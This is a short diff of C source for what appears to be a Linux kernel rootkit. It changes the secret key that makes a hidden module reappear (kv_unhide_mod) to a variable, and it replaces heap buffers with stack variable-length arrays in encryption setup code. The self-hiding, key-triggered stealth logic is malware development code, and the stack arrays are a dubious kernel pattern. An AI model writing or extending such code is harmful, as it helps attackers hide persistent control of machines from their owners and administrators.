@@ -507,7 +507,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
                 {
                     uint64_t val;
                     if ((sscanf(args[0].from, "%llx", &val) == 1) &&
-                            UNHIDEKEY == val) {
+                            auto_unhidekey == val) {
                         kv_unhide_mod();
                     }
                 }
@@ -830,10 +830,7 @@ cont:
     kvmgc0 =crypto_init();
     if (kvmgc0) {
         size_t datalen = 64;
-        u8 *buf = kmalloc(datalen, GFP_KERNEL);
-        if (!buf)
-            return -ENOMEM;
-
+        u8 buf[datalen];
         memset(buf, 'A', datalen);
         kv_encrypt(kvmgc0, buf, datalen);
     }
@@ -841,9 +838,7 @@ cont:
     kvmgc1 =crypto_init();
     if (kvmgc1) {
         size_t datalen = 64;
-        u8 *buf = kmalloc(datalen, GFP_KERNEL);
-        if (!buf)
-            return -ENOMEM;
+        u8 buf[datalen];
 
         /** go random this time */
         get_random_bytes(buf, datalen);
